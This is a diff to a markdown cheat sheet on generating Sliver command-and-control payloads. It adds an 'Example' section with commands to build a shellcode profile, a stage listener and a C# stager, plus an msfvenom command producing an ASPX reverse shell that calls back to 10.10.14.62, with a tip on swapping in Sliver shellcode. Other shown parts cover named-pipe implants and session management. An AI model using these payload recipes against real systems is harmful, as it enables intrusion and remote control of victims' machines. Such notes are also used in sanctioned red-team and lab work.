@@ -1,8 +1,10 @@
 # Sliver payload generation
 
-#### [Generic Beacon / Implant generation](sliver-payload-generation.md#generic-beacon-implant-generation-1)
+[Generic Beacon / Implant generation](sliver-payload-generation.md#generic-beacon-implant-generation-1)
 
 [Named Pipe Payload Generation](sliver-payload-generation.md#named-pipe-payload-generation)
+
+[Example](sliver-payload-generation.md#example)
 
 #### Generic Beacon / Implant generation
 
@@ -27,7 +29,7 @@ Some helpful flags to consider when generating beacons are:
 
 to start your listener just type&#x20;
 
-```
+```bash
 http
 OR
 http --lport 8088
@@ -49,12 +51,23 @@ generate --named-pipe <ip>/pipe/hack -N hack_pipe
 
 #### Session Management
 
-```
+```bash
 sessions         # Lists active / inactive sessions
 sesskions -K     # Removes all sessions available or not
 sessions prune   # Removes unavailable sessions
 sessions -k -i <session> # Removes specific session
 beacons          # lists active/inactive beacons
 interactive      # turns a beacon into an interactive session
+```
+
+#### Example
+
+```bash
+profiles new --http <ip>:8088 --format shellcode hack
+stage-listener --url tcp://<ip>:4443 --profile hack
+http -L <ip> -l 8088
+generate stager --lhost <ip> --lport 4443 --format csharp --save staged.txt
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
+# Replace the msf shellcode with the sliver shellcode and you have a good aspx agent
 ```
 
